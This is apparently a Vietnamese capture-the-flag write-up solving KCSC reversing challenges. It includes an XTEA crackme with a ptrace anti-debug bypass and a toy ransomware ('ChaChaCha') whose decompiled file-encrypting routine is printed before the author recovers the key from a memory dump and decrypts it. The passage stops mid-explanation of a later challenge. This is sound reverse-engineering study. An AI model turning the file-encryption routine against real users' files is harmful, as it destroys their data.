Phân tích qua các `case` gọi hàm `_bittest64`.

Trước tiên `_bittest64` là một hàm nội tuyến (intrinsic function) trong thư viện ngôn ngữ C của Microsoft sử dụng để kiểm tra trạng thái của một bit cụ thể trong một số nguyên 64-bit. [tham khảo ở đây](https://learn.microsoft.com/en-us/cpp/intrinsics/bittest-bittest64?view=msvc-170)

Syntax như sau:

![ảnh](https://hackmd.io/_uploads/Ska465jPkg.png)

Viết = python:

```python
def _bittest64(value, pos):
    return bool(value & (1 << pos))
```

Ví du: 
```c
case '_':
        if ( pos <= 0x31 )
        {
          v20 = 0x2101004011000LL;
          if ( _bittest64(&v20, pos) )
            ++idx;
        }
        break;
```
`Case '_' với v20 = 0x2101004011000` biểu diễn ở dạng binary như sau: `0000 0000 0000 0010 0001 0000 0001 0000 0000 0100 0000 0001 0001 0000 0000 0000`
Hàm sẽ trả về 1 nếu là vị trí bit 1 (từ phải sang): 12, 16, 24,... thì `idx++` tức là  ký tự '_' sẽ xuất hiện ở các vị trí 12, 16, 24,... vì thế minh hoạ cách tìm `pos` đúng như sau:

```python
# Case '_'
v20 = 0x2101004011000
if pos <= 0x31 and _bittest64(v20, pos):
    res[pos] = '_'
    continue
```

Tóm lại, để tìm $input$ đúng sẽ mô phỏng lại chương trình đặt 62 ký tự vào đúng vị trí dựa trên các case.

```python
def _bittest64(value, pos):
    return bool(value & (1 << pos))

def main():
    res = [' '] * 62
    
    v5 = 0x1000008020020
    v7 = 0x60010020000100
    v8 = 0x100020080408000
    v9 = 0x844000044000

    for pos in range(62):
        # Case 'C'
        if (pos - 1) & 0xFFFFFFFD == 0:  # pos == 1 hoặc pos == 3
            res[pos] = 'C'
            continue
            
        # Case 'K'
        if pos == 0:
            res[pos] = 'K'
            continue
            
        # Case 'S'
        if pos == 2:
            res[pos] = 'S'
            continue
            
        # Case '_'
        v20 = 0x2101004011000
        if pos <= 0x31 and _bittest64(v20, pos):
            res[pos] = '_'
            continue
            
        # Case 'a'
        v19 = 0x10000210000040
        if pos <= 0x34 and _bittest64(v19, pos):
            res[pos] = 'a'
            continue
            
        # Case 'c'
        if pos == 37:
            res[pos] = 'c'
            continue
            
        # Case 'd'
        if pos == 20:
            res[pos] = 'd'
            continue
            
        # Case 'e'
        v18 = 0x80000040200000
        if pos <= 0x37 and _bittest64(v18, pos):
            res[pos] = 'e'
            continue
            
        # Case 'f'
        v17 = 0x4200100802000
        if pos <= 0x32 and _bittest64(v17, pos):
            res[pos] = 'f'
            continue
            
        # Case 'g'
        if pos in [11, 60]:
            res[pos] = 'g'
            continue
            
        # Case 'i'
        v16 = 0x400000000000280
        if pos <= 0x3A and _bittest64(v16, pos):
            res[pos] = 'i'
            continue
            
        # Case 'l'
        v15 = 0x8480C02000000
        if pos <= 0x33 and _bittest64(v15, pos):
            res[pos] = 'l'
            continue
            
        # Case 'n'
        v14 = 0xA00008000080400
        if pos <= 0x3B and _bittest64(v14, pos):
            res[pos] = 'n'
            continue
            
        # Case 'o'
        if pos <= 0x2F and _bittest64(v9, pos):
            res[pos] = 'o'
            continue
            
        # Case 'r'
        if pos <= 0x38 and _bittest64(v8, pos):
            res[pos] = 'r'
            continue
            
        # Case 't'
        if pos <= 0x36 and _bittest64(v7, pos):
            res[pos] = 't'
            continue
            
        # Case 'u'
        if pos == 24:
            res[pos] = 'u'
            continue
            
        # Case 'w'
        if pos <= 0x30 and _bittest64(v5, pos):
            res[pos] = 'w'
            continue
            
        # Case '{'
        if pos == 4:
            res[pos] = '{'
            continue
            
        # Case '}'
        if pos == 61:
            res[pos] = '}'
            continue

    print(''.join(res))

main()
```

>  `KCSC{waiting_for_wonderful_waterfall_control_flow_flatterning}`

![ảnh](https://hackmd.io/_uploads/By8VWsjDJx.png)


## 6. Reverse me

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  int i; // [rsp+18h] [rbp-58h]
  int j; // [rsp+1Ch] [rbp-54h]
  _BYTE input[56]; // [rsp+30h] [rbp-40h] BYREF
  unsigned __int64 v7; // [rsp+68h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  memset(input, 0, 0x31uLL);
  printf("FLAG: ");
  __isoc99_scanf("%48s", input);
  for ( i = 0; i <= 47; i += 8 )
    enc(&input[i], &input[i + 4]);
  for ( j = 0; ; ++j )
  {
    if ( j > 47 )
    {
      puts("Correct!");
      return 0LL;
    }
    if ( input[j] != enc_flag[j] )
      break;
  }
  puts("Incorrect!");
  return 0LL;
}
```

Load vào IDA thấy hàm `main` khá ngắn gọn check `input` với 48 ký tự xử lý lần lượt từng block 8 bytes qua hàm `enc` sau đó so sánh với `enc_flag`.

![ảnh](https://hackmd.io/_uploads/BygZJnswJx.png)
![ảnh](https://hackmd.io/_uploads/SkIBy2sPkx.png)
![Ảnh](https://hackmd.io/_uploads/SyXkl3owJx.png)
![ảnh](https://hackmd.io/_uploads/BJrQl3oDJe.png)
![ảnh](https://hackmd.io/_uploads/B11V-hjDkl.png)
![ảnh](https://hackmd.io/_uploads/SyL5gnoPyx.png)

Debug tại `enc` kiểm tra số byte được xử lý.

![ảnh](https://hackmd.io/_uploads/r1bfMnoDJe.png)

Vào hàm `enc` 

![ảnh](https://hackmd.io/_uploads/SJE_7hswkx.png)

Để ý giá trị hằng số `dword_5555555580A0` được khởi tạo = `0x9E3779B9` rất lạ nên google thử.

![ảnh](https://hackmd.io/_uploads/Byh-V3ovyl.png)

Nó chính là `delta` (còn gọi là số vàng _ [Golden Ratio](https://en.wikipedia.org/wiki/Golden_ratio))sử dụng trong thuật toán [TEA_Tiny Encryption Algorithm](https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm).

> Về cơ bản thì **TEA** là thuật toán mã hoá khối sử dụng cặp 32-bit blocks (4-4 bytes) với các phép XOR và shift bits đặc trưng, có delta constant và key schedule.
{: .prompt-info }

![ảnh](https://hackmd.io/_uploads/r11xv2iDke.png)

![ảnh](https://hackmd.io/_uploads/SyGwS3swJx.png)

Phân tích qua thì thuật toán duyệt vòng lặp 32 lần (dword_555555558020 = 0x20)
![ảnh](https://hackmd.io/_uploads/By-SIhsvkx.png)
v5 được cộng với `delta`, thực hiện các phép biến đổi trên v3 và v4 sau đó gán lại cho a1 và a2 (8 byte đã được mã hoá).

Để giải mã cần `key`, `delta` và `enc_flag`. Mô phỏng hàm `enc` = python:
```python
def encrypt(v4, v5):
    for i in range(rounds):

        v4 = (v4 + ((((v5 >> 5) ^ ((16 * v5) & 0xFFFFFFFF)) + v5) ^ 
             (key[sum & 3] + sum))) & 0xFFFFFFFF
        
        sum = (sum + delta) & 0xFFFFFFFF
        
        v5 = (v5 + ((((v4 >> 5) ^ ((16 * v4) & 0xFFFFFFFF)) + v4) ^ 
             (key[(sum >> 11) & 3] + sum))) & 0xFFFFFFFF
    
    return v4, v5
```

Hàm `decrypt`:
```python
def decrypt(v4, v5):
    sum = (delta * rounds) & 0xFFFFFFFF
    
    for i in range(rounds):
        v5 = (v5 - ((((v4 >> 5) ^ ((16 * v4) & 0xFFFFFFFF)) + v4) ^ 
             (key[(sum >> 11) & 3] + sum))) & 0xFFFFFFFF
        
        sum = (sum - delta) & 0xFFFFFFFF
        
        v4 = (v4 - ((((v5 >> 5) ^ ((16 * v5) & 0xFFFFFFFF)) + v5) ^ 
             (key[sum & 3] + sum))) & 0xFFFFFFFF
    
    return v4, v5
```
Trước khi lấy giá trị của `key` check thử xem nó được khởi tạo như thế nào thì `key` đã được gọi trước trong hàm `sub_5555555551E9` nên trace thử tới xem.
![ảnh](https://hackmd.io/_uploads/SyRyh3iD1g.png)

![ảnh](https://hackmd.io/_uploads/H18_n2iwyx.png)

Quan sát `key` được khởi tạo nằm trong 2 điều kiện khác nhau bằng việc gọi `ptrace`.

> **ptrace** là một hệ thống gọi (system call) trong Linux, cung cấp một cách để các tiến trình (process) quan sát và điều khiển các tiến trình khác. Nó cung cấp phương tiện để một tiến trình ("tracer") có thể quan sát và kiểm soát việc thực thi của người khác xử lý ("dấu vết"). [chi tiết ở đây](https://man7.org/linux/man-pages/man2/ptrace.2.html)
{: .prompt-info }

Tóm lại ở hàm này thực hiện `anti-debug` trong linux nếu ko debug thì `result` trả về 0 ngược lại trả về 1.

Vì thế đặt bp tại `test al, al` và thay đổi giá trị `rax` = 0 để nhận được `key` đúng.

![ảnh](https://hackmd.io/_uploads/BJ1IJasDJe.png)

Đây là `key` chính xác:
![ảnh](https://hackmd.io/_uploads/BytR16sPJx.png)

`enc_flag`:
![ảnh](https://hackmd.io/_uploads/ByKNbToDkl.png)

```python
delta = 0x9E3779B9
rounds = 32
key = [0x3AB27278, 0xA840805B, 0xE864925B, 0xB7B1EEDE]

def decrypt(v4, v5):
    sum = (delta * rounds) & 0xFFFFFFFF
    
    for i in range(rounds):
        v5 = (v5 - ((((v4 >> 5) ^ ((16 * v4) & 0xFFFFFFFF)) + v4) ^ 
             (key[(sum >> 11) & 3] + sum))) & 0xFFFFFFFF
        
        sum = (sum - delta) & 0xFFFFFFFF
        
        v4 = (v4 - ((((v5 >> 5) ^ ((16 * v5) & 0xFFFFFFFF)) + v5) ^ 
             (key[sum & 3] + sum))) & 0xFFFFFFFF
    
    return v4, v5

def main():
    enc_flag = [
        0xEC, 0xB6, 0x37, 0x1C, 0x76, 0x66, 0xE3, 0xB0, 0x6F, 0xC1, 0x37, 0x41,
        0x6D, 0x46, 0x4D, 0x45, 0x3B, 0xFE, 0x0A, 0x7A, 0x39, 0x5B, 0x5B, 0x23,
        0x96, 0x71, 0x31, 0xCA, 0x36, 0xC0, 0xB9, 0x7D, 0x1C, 0x88, 0xC3, 0xBA,
        0xA4, 0x25, 0x99, 0x08, 0xA9, 0x59, 0x2A, 0xFE, 0x26, 0x18, 0xE6, 0x94
    ]
   
    enc_bytes = bytearray(enc_flag)
    dec = bytearray(len(enc_bytes))
    for i in range(0, len(enc_bytes), 8):
        v4 = int.from_bytes(enc_bytes[i:i+4], 'little')
        v5 = int.from_bytes(enc_bytes[i+4:i+8], 'little')

        dec_v4, dec_v5 = decrypt(v4, v5)

        dec[i:i+4] = dec_v4.to_bytes(4, 'little')
        dec[i+4:i+8] = dec_v5.to_bytes(4, 'little')

    print(dec.decode())


main()
```

>  `KCSC{XTEA_encryption_and_debugger_detection_:>>}`

![ảnh](https://hackmd.io/_uploads/rymrjpiDkx.png)


## 7. ChaChaCha

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  HMODULE LibraryA; // eax
  BOOLEAN (__stdcall *SystemFunction036)(PVOID, ULONG); // eax
  HMODULE v5; // eax
  BOOLEAN (__stdcall *ProcAddress)(PVOID, ULONG); // eax
  HANDLE FileW; // eax
  void *v8; // ebx
  signed int FileSize; // edi
  _BYTE *v11; // ebx
  int v12; // ecx
  signed int v13; // esi
  signed int v14; // ebx
  _BYTE *v15; // eax
  _BYTE *v16; // ecx
  char v17; // al
  char v18; // [esp+0h] [ebp-D8h]
  HANDLE hFile; // [esp+Ch] [ebp-CCh]
  signed int v20; // [esp+10h] [ebp-C8h]
  char *v21; // [esp+14h] [ebp-C4h]
  _BYTE *v22; // [esp+18h] [ebp-C0h]
  int *v23; // [esp+1Ch] [ebp-BCh]
  DWORD NumberOfBytesWritten; // [esp+20h] [ebp-B8h] BYREF
  DWORD NumberOfBytesRead; // [esp+24h] [ebp-B4h] BYREF
  __m128i a1[3]; // [esp+28h] [ebp-B0h] BYREF
  int v27; // [esp+58h] [ebp-80h]
  int a2[16]; // [esp+68h] [ebp-70h] BYREF
  char v29[32]; // [esp+A8h] [ebp-30h] BYREF
  unsigned __int8 a4[12]; // [esp+C8h] [ebp-10h] BYREF

  LibraryA = LoadLibraryA("advapi32.dll");
  SystemFunction036 = (BOOLEAN (__stdcall *)(PVOID, ULONG))GetProcAddress(LibraryA, "SystemFunction036");
  SystemFunction036(v29, 32);
  v5 = LoadLibraryA("advapi32.dll");
  ProcAddress = (BOOLEAN (__stdcall *)(PVOID, ULONG))GetProcAddress(v5, "SystemFunction036");
  ProcAddress(a4, 12);
  FileW = CreateFileW(FileName, 0xC0000000, 0, 0, 3u, 0x80u, 0);
  v8 = FileW;
  hFile = FileW;
  if ( FileW == (HANDLE)-1 )
  {
    sub_401590("Cannot Open File", v18);
    CloseHandle((HANDLE)0xFFFFFFFF);
    return 1;
  }
  else
  {
    FileSize = GetFileSize(FileW, 0);
    v20 = FileSize;
    v21 = (char *)malloc(FileSize);
    if ( ReadFile(v8, v21, FileSize, &NumberOfBytesRead, 0) )
    {
      v11 = malloc(FileSize);
      v22 = v11;
      sub_4013D0(a1, (unsigned __int8 *)v29, v12, a4);
      v13 = 0;
      if ( FileSize > 0 )
      {
        v23 = a2;
        do
        {
          sub_401000(a1, (int)a2);
          ++v27;
          v14 = v13 + 64;
          if ( !__OFSUB__(v13, v13 + 64) )
          {
            v15 = v22;
            do
            {
              if ( v13 >= FileSize )
                break;
              v16 = &v15[v13];
              v17 = *((_BYTE *)v23 + v13) ^ v15[v13 + v21 - v22];
              ++v13;
              FileSize = v20;
              *v16 = v17;
              v15 = v22;
            }
            while ( v13 < v14 );
          }
          v23 -= 16;
          v13 = v14;
        }
        while ( v14 < FileSize );
        v11 = v22;
      }
      SetFilePointer(hFile, 0, 0, 0);
      if ( WriteFile(hFile, v11, FileSize, &NumberOfBytesWritten, 0) )
      {
        CloseHandle(hFile);
        sub_401590("Some important file has been encrypted!!!\n", (char)FileName);
        return 0;
      }
      else
      {
        sub_401590("Cannot Write File", v18);
        CloseHandle(hFile);
        return 1;
      }
    }
    else
    {
      sub_401590("Cannot Read File", v18);
      CloseHandle(v8);
      return 1;
    }
  }
}
```

Khái quát chal này mô phỏng 1 mã độc mã hoá tệp (ransomeware) với flow như sau:
* Tải thư viện `advapi32.dll` và gọi `SystemFunction036` để sinh ngẫu nhiên:
  - 32 byte đầu tiên vào biến v29
    ![ảnh](https://hackmd.io/_uploads/HJrbE0jPkx.png)
  - 12 byte tiếp theo vào biến a4
    ![ảnh](https://hackmd.io/_uploads/ByuSN0jwkx.png)
* Mở file `important.txt`:
![ảnh](https://hackmd.io/_uploads/rkjzg0iwkl.png)
* Mã hoá phức tạp qua hàm `sub_4013D0` và `sub_401000`.
* Ghi đè nội dung đã mã hóa lên file gốc.
* Cuối cùng hiển thị thông báo "Some important file has been encrypted!!!"

Đi vào hàm `sub_4013D0` --> `init_state`
```c
void __fastcall init_state(_DWORD *a1, unsigned __int8 *a2, int a3, unsigned __int8 *a4)
{
  int v5; // esi
  int v6; // ecx
  int v7; // eax
  int v8; // ecx
  int v9; // eax
  int v10; // ecx
  int v11; // eax
  int v12; // ecx
  int v13; // eax
  int v14; // ecx
  int v15; // eax
  int v16; // ecx
  int v17; // eax
  int v18; // ecx
  int v19; // eax
  int v20; // ecx
  int v21; // eax

  v5 = *a2 | ((a2[1] | (*((unsigned __int16 *)a2 + 1) << 8)) << 8);
  v6 = *((unsigned __int16 *)a2 + 3);
  qmemcpy(a1, "expand 32-byte k", 16);
  v7 = a2[10];
  a1[5] = a2[4] | ((a2[5] | (v6 << 8)) << 8);
  v8 = v7 | (a2[11] << 8);
  a1[4] = v5;
  v9 = a2[14];
  a1[6] = a2[8] | ((a2[9] | (v8 << 8)) << 8);
  v10 = a2[12] | ((a2[13] | ((v9 | (a2[15] << 8)) << 8)) << 8);
  v11 = a2[18];
  a1[7] = v10;
  v12 = a2[16] | ((a2[17] | ((v11 | (a2[19] << 8)) << 8)) << 8);
  v13 = a2[22];
  a1[8] = v12;
  v14 = a2[20] | ((a2[21] | ((v13 | (a2[23] << 8)) << 8)) << 8);
  v15 = a2[26];
  a1[9] = v14;
  v16 = a2[24] | ((a2[25] | ((v15 | (a2[27] << 8)) << 8)) << 8);
  v17 = a2[30];
  a1[10] = v16;
  a1[11] = a2[28] | ((a2[29] | ((v17 | (a2[31] << 8)) << 8)) << 8);
  v18 = *((unsigned __int16 *)a4 + 1);
  a1[12] = 1129530187; // "KCSC"
  v19 = a4[6];
  a1[13] = *a4 | ((a4[1] | (v18 << 8)) << 8);
  v20 = a4[4] | ((a4[5] | ((v19 | (a4[7] << 8)) << 8)) << 8);
  v21 = a4[10];
  a1[14] = v20;
  a1[15] = a4[8] | ((a4[9] | ((v21 | (a4[11] << 8)) << 8)) << 8);
}
```

Hàm này khởi tạo key mã hóa từ 32 bytes ngẫu nhiên v29(a2) và 12 bytes ngẫu nhiên a4.

Khái quát qua `sub_401000`_`enc` là hàm mã hóa chính, thực hiện mã hóa từng khối 64 bytes.

Sử dụng phép toán XOR và các phép dịch bit phức tạp

Vòng lặp chính lặp lại 10 lần.

Mô phỏng lại = python:
```python
def init_state(a1, key, a3, nonce):
    # Gán giá trị "expand 32-byte k" vào a1[0] đến a1[3]
    a1[0] = 0x61707865  # 'exp' 
    a1[1] = 0x3320646e  # 'and '
    a1[2] = 0x79622d32  # '32-b'
    a1[3] = 0x6b206574  # 'yte k'
    
    # Xử lý key
    def join_bytes(b1, b2, b3, b4):
        return b1 | (b2 << 8) | (b3 << 16) | (b4 << 24)
    
    a1[4] = join_bytes(key[0], key[1], key[2], key[3])
    a1[5] = join_bytes(key[4], key[5], key[6], key[7])
    a1[6] = join_bytes(key[8], key[9], key[10], key[11])
    a1[7] = join_bytes(key[12], key[13], key[14], key[15])
    a1[8] = join_bytes(key[16], key[17], key[18], key[19])
    a1[9] = join_bytes(key[20], key[21], key[22], key[23])
    a1[10] = join_bytes(key[24], key[25], key[26], key[27])
    a1[11] = join_bytes(key[28], key[29], key[30], key[31])
    
    # Hằng số
    a1[12] = 0x4353434B  # 'CSCK'
    
    # Xử lý nonce
    a1[13] = join_bytes(nonce[0], nonce[1], nonce[2], nonce[3])
    a1[14] = join_bytes(nonce[4], nonce[5], nonce[6], nonce[7])
    a1[15] = join_bytes(nonce[8], nonce[9], nonce[10], nonce[11])
```

```python
def enc(state):
    x = state.copy()

    for _ in range(10):
        for a, b, c, d in [(0, 4, 8, 12), (1, 5, 9, 13), (2, 6, 10, 14), (3, 7, 11, 15),
                           (0, 5, 10, 15), (1, 6, 11, 12), (2, 7, 8, 13), (3, 4, 9, 14)]:
            x[a] = (x[a] + x[b]) & 0xFFFFFFFF
            x[d] = rotl(x[d] ^ x[a], 16)
            x[c] = (x[c] + x[d]) & 0xFFFFFFFF
            x[b] = rotl(x[b] ^ x[c], 12)
            x[a] = (x[a] + x[b]) & 0xFFFFFFFF
            x[d] = rotl(x[d] ^ x[a], 8)
            x[c] = (x[c] + x[d]) & 0xFFFFFFFF
            x[b] = rotl(x[b] ^ x[c], 7)

    output = [(x[i] + state[i]) & 0xFFFFFFFF for i in range(16)]
    state[12] = (state[12] + 1) & 0xFFFFFFFF
    return output
```

> Chal có tên là `ChaChaCha` liên quan đến thuật toán mã hoá mã hóa đối xứng, mã hóa và giải mã dữ liệu bằng cùng một khóa 256 bit.  được thiết kế bởi Daniel J. Bernstein. Nó là một biến thể cải tiến của thuật toán Salsa20. 
{: .prompt-info }

Tóm tắt cách hoạt động của ChaCha:
* Khởi tạo trạng thái: ChaCha khởi tạo trạng thái từ khóa bí mật, số nonce (số khởi tạo duy nhất) và số đếm khối.
* Chuyển đổi trạng thái: Sử dụng các vòng lặp để chuyển đổi trạng thái bằng cách thực hiện các phép toán cộng, XOR và dịch vòng.
* Sinh dòng khóa: Sau khi chuyển đổi trạng thái, ChaCha sinh ra một dòng khóa dùng để mã hóa hoặc giải mã dữ liệu.

Tóm lại để giải mã file cần `key` và `nonce` ban đầu, nhưng ở chương trình `key` và `nonce` được khởi tạo ngẫu nhiên vì thế phải dựa vào file `ChaChaCha.DMP` để xác định.

> file DMP lưu trữ thông tin chẩn đoán về trạng thái của một chương trình hoặc hệ thống tại một thời điểm cụ thể.
{: .prompt-info }

Đặt bp tại `init_state`.

![ảnh](https://hackmd.io/_uploads/rkdyG13D1x.png)

![ảnh](https://hackmd.io/_uploads/rJVwmJ2Pkg.png)
![ảnh](https://hackmd.io/_uploads/S17omyhv1e.png)

**F8** và kiểm tra a1:
![ảnh](https://hackmd.io/_uploads/HJhHE1hvyl.png)

`key` và `nonce` đã được gán vào a1 thành công. Ta dựa vào đó để tìm trong file DMP:
![ảnh](https://hackmd.io/_uploads/H1TiNyhwkl.png)

32 byte nằm sau "expand 32-byte k" là `key` tiếp theo là 4 byte `KCSC` và 12 byte cuối sẽ là `nonce`.

```python
state = '65 78 70 61 6E 64 20 33 32 2D 62 79 74 65 20 6B D9 FA BB 42 0C 2D B8 08 D1 F8 BF A5 89 0A C3 B3 84 9F 69 E2 F3 30 D4 A9 0D B1 19 BD 4E A0 B8 30 4B 43 53 43 DB 7B E6 93 EE 9B C1 A4 70 73 CA 4B'

state = state.split()
state = [int(val, 16) for val in state]

key = bytes(state[16:48])
counter = bytes(state[48:52])
nonce = bytes(state[52:64])

print(f'\nKey: {key.hex()}')
print(f'\nCounter: {int.from_bytes(counter, 'little')}')
print(f'\nNoncce: {nonce.hex()}')
```

```
Key: d9fabb420c2db808d1f8bfa5890ac3b3849f69e2f330d4a90db119bd4ea0b830

Counter: 1129530187

Noncce: db7be693ee9bc1a47073ca4b
```

```python
import struct
import sys

SIGMA = b'expand 32-byte k'

def initialize_state(key_hex, nonce_hex):
    state = list(struct.unpack('<4I', SIGMA))

    key_bytes = bytes.fromhex(key_hex)
    nonce_bytes = bytes.fromhex(nonce_hex)

    # Load key (32 bytes)
    for i in range(8):
        state.append(int.from_bytes(key_bytes[i*4:(i+1)*4], 'little'))

    # Set counter
    state.append(1129530187)

    # Load nonce (12 bytes)
    state.append(int.from_bytes(nonce_bytes[0:4], 'little'))
    state.append(int.from_bytes(nonce_bytes[4:8], 'little'))
    state.append(int.from_bytes(nonce_bytes[8:12], 'little'))

    return state


def rotl(value, shift):
    return ((value << shift) | (value >> (32 - shift))) & 0xFFFFFFFF


def chacha_block(state):
    x = state.copy()

    for _ in range(10):
        for a, b, c, d in [(0, 4, 8, 12), (1, 5, 9, 13), (2, 6, 10, 14), (3, 7, 11, 15),
                          (0, 5, 10, 15), (1, 6, 11, 12), (2, 7, 8, 13), (3, 4, 9, 14)]:
            x[a] = (x[a] + x[b]) & 0xFFFFFFFF
            x[d] = rotl(x[d] ^ x[a], 16)
            x[c] = (x[c] + x[d]) & 0xFFFFFFFF
            x[b] = rotl(x[b] ^ x[c], 12)
            x[a] = (x[a] + x[b]) & 0xFFFFFFFF
            x[d] = rotl(x[d] ^ x[a], 8)
            x[c] = (x[c] + x[d]) & 0xFFFFFFFF
            x[b] = rotl(x[b] ^ x[c], 7)

    output = [(x[i] + state[i]) & 0xFFFFFFFF for i in range(16)]
    state[12] = (state[12] + 1) & 0xFFFFFFFF
    return output

def decrypt_file(input_file, output_file, key_hex, nonce_hex):
    try:
        with open(input_file, 'rb') as in_file, open(output_file, 'wb') as out_file:
            state = initialize_state(key_hex, nonce_hex)

            while chunk := in_file.read(64):
                keystream = chacha_block(state)
                keystream_bytes = b''.join(struct.pack('<I', word) for word in keystream)
                decrypted_chunk = bytes(a ^ b for a, b in zip(chunk, keystream_bytes))
                out_file.write(decrypted_chunk[:len(chunk)])
        print("Pass")
    except IOError as e:
        print("Error")

def main():
    key = "D9FABB420C2DB808D1F8BFA5890AC3B3849F69E2F330D4A90DB119BD4EA0B830"
    nonce = "DB7BE693EE9BC1A47073CA4B"
    decrypt_file("important_note.txt", "decrypted.txt", key, nonce)


main()
```

Viết script giải mã khá dài, lưu ý đã có `key`, `nonce`, `counter` nên ta có thể đưa lên cyberchef với thông số như sau để decrypt: [cyberchecf](https://gchq.github.io/CyberChef/#recipe=ChaCha(%7B'option':'Hex','string':'d9fabb420c2db808d1f8bfa5890ac3b3849f69e2f330d4a90db119bd4ea0b830'%7D,%7B'option':'Hex','string':'db7be693ee9bc1a47073ca4b'%7D,1129530187,'20','Raw','Raw')&oeol=VT)

![ảnh](https://hackmd.io/_uploads/HkVDLQz_kg.png)
![ảnh](https://hackmd.io/_uploads/rk9Ovmz_1e.png)

Sau khi decrypt ta thấy header của file có dạng `MZ` chính là file `PE` (.exe) vì thế lưu file với định dạng `.exe`.

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  HANDLE FileW; // r14
  HRSRC ResourceW; // rax
  HRSRC v5; // rbx
  HGLOBAL Resource; // rdi
  unsigned int v7; // ebx
  const void *v8; // rsi
  char *v9; // rax
  char *v10; // rdi
  __int64 v11; // rdx
  __m128 si128; // xmm2
  unsigned int v13; // r8d
  __int64 v14; // rax
  char *v15; // rax
  __int64 v16; // rdx
  DWORD NumberOfBytesWritten; // [rsp+40h] [rbp-448h] BYREF
  WCHAR FileName[264]; // [rsp+50h] [rbp-438h] BYREF
  WCHAR Buffer[264]; // [rsp+260h] [rbp-228h] BYREF

  if ( GetTempPathW(0x104u, Buffer) - 1 <= 0x103 )
  {
    wsprintfW(FileName, L"%s%s", Buffer, L"REAL_FLAG_IN_HERE");
    FileW = CreateFileW(FileName, 0x40000000u, 0, 0LL, 2u, 0x80u, 0LL);
    if ( FileW != (HANDLE)-1LL )
    {
      NumberOfBytesWritten = 0;
      ResourceW = FindResourceW(0LL, (LPCWSTR)0x65, L"FLAG");
      v5 = ResourceW;
      if ( ResourceW )
      {
        Resource = LoadResource(0LL, ResourceW);
        if ( Resource )
        {
          v7 = SizeofResource(0LL, v5);
          if ( v7 )
          {
            v8 = LockResource(Resource);
            if ( v8 )
            {
              v9 = (char *)malloc(v7);
              v10 = v9;
              if ( v9 )
              {
                memcpy(v9, v8, v7);
                v11 = 0LL;
                if ( v7 < 0x40 )
                  goto LABEL_13;
                si128 = (__m128)_mm_load_si128((const __m128i *)&xmmword_140003330);
                v13 = 32;
                do
                {
                  *(__m128 *)&v10[v11] = _mm_xor_ps(si128, (__m128)_mm_loadu_si128((const __m128i *)&v10[v11]));
                  v11 = (unsigned int)(v11 + 64);
                  *(__m128 *)&v10[v13 - 16] = _mm_xor_ps(
                                                (__m128)_mm_loadu_si128((const __m128i *)&v10[v13 - 16]),
                                                si128);
                  *(__m128 *)&v10[v13] = _mm_xor_ps(si128, (__m128)_mm_loadu_si128((const __m128i *)&v10[v13]));
                  v14 = v13 + 16;
                  v13 += 64;
                  *(__m128 *)&v10[v14] = _mm_xor_ps((__m128)_mm_loadu_si128((const __m128i *)&v10[v14]), si128);
                }
                while ( (unsigned int)v11 < (v7 & 0xFFFFFFC0) );
                if ( (unsigned int)v11 < v7 )
                {
LABEL_13:
                  v15 = &v10[(unsigned int)v11];
                  v16 = v7 - (unsigned int)v11;
                  do
                  {
                    *v15++ ^= 0x88u;
                    --v16;
                  }
                  while ( v16 );
                }
                WriteFile(FileW, v10, v7, &NumberOfBytesWritten, 0LL);
                free(v10);
                sub_140001010((wchar_t *)L"Here is your Flag: %s\n");
                CloseHandle(FileW);
              }
            }
          }
        }
      }
    }
  }
  return 0;
}
```

Khái quát qua thì file `decrypted.exe` sẽ sử dụng hàm `GetTempPathW` để lấy đường dẫn thư mục tạm thời trên hệ thống và ghép thêm tên tệp `"REAL_FLAG_IN_HERE"` vào đường dẫn này.

Tệp `REAL_FLAG_IN_HERE` chính là file chứa flag cần tìm vì thế chạy file `decrypted.exe` để lấy flag.

![ảnh](https://hackmd.io/_uploads/B15j813Dyl.png)

Flag nằm trong đường dẫn đó copy lấy ra thui!!

![ảnh](https://hackmd.io/_uploads/SyGNvynvkl.png)

File flag là dạng ảnh `JPEG` vì thế đổi đuôi file để lấy flag.

![REAL_FLAG_IN_HERE](https://hackmd.io/_uploads/S1qYDkhDke.jpg)

> `KCSC{chachacha_w1th_me_and_welc0me_2_KCSC}`


## 8. OptimusPrize

![ảnh](https://hackmd.io/_uploads/HybY_13DJg.png)

Chạy thử thì chal in ra `KCS` sau đó chạy rất lâu.

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned __int8 dec_char; // [rsp+21h] [rbp-27h]
  int i; // [rsp+24h] [rbp-24h]
  int fib_res; // [rsp+28h] [rbp-20h]
  char v7; // [rsp+2Ch] [rbp-1Ch]
  char v8; // [rsp+30h] [rbp-18h]
  char v9; // [rsp+34h] [rbp-14h]

  for ( i = 0; i < 50; ++i )
  {
    quick_sort(enc_data, 0, enc_length[i]);
    v7 = *(_DWORD *)get_element(enc_data, enc_length[i] >> 1);
    v8 = BYTE1(*(_DWORD *)get_element(enc_data, enc_length[i] >> 1)) ^ v7;
    v9 = HIWORD(*(_DWORD *)get_element(enc_data, enc_length[i] >> 1)) ^ v8;
    dec_char = HIBYTE(*(_DWORD *)get_element(enc_data, enc_length[i] >> 1)) ^ v9;
    fib_res = fibonacci(2 * i);
    print(
      "%c",
      enc_char[i] ^ dec_char ^ (unsigned int)(unsigned __int8)(HIBYTE(fib_res) ^ BYTE2(fib_res) ^ BYTE1(fib_res) ^ fib_res));
  }
  return 0;
}
```

Đổi tên biến và deobfuscate hàm main như trên.

```c
void __fastcall quick_sort(_QWORD *arr, signed int a2, unsigned int mid)
{
  int *v3; // rax
  unsigned int end; // [rsp+20h] [rbp-28h]
  _DWORD *element_safe; // [rsp+28h] [rbp-20h]
  int *element; // [rsp+30h] [rbp-18h]

  if ( a2 < (int)mid )
  {
    end = (int)(mid + a2) >> 1;
    quick_sort(arr, a2, end);
    quick_sort(arr, end + 1, mid);
    element_safe = (_DWORD *)get_ele_safe(arr, end);
    if ( *element_safe > *(_DWORD *)get_ele_safe(arr, (int)mid) )
    {
      element = (int *)get_element(arr, (int)mid);
      v3 = (int *)get_element(arr, end);
      swap(v3, element);
    }
    quick_sort(arr, a2, mid - 1);
  }
}
```

Tóm tắt flow chương trình:

Vòng lặp chạy 50 lần, mỗi lần giải mã một ký tự.

Với mỗi ký tự:
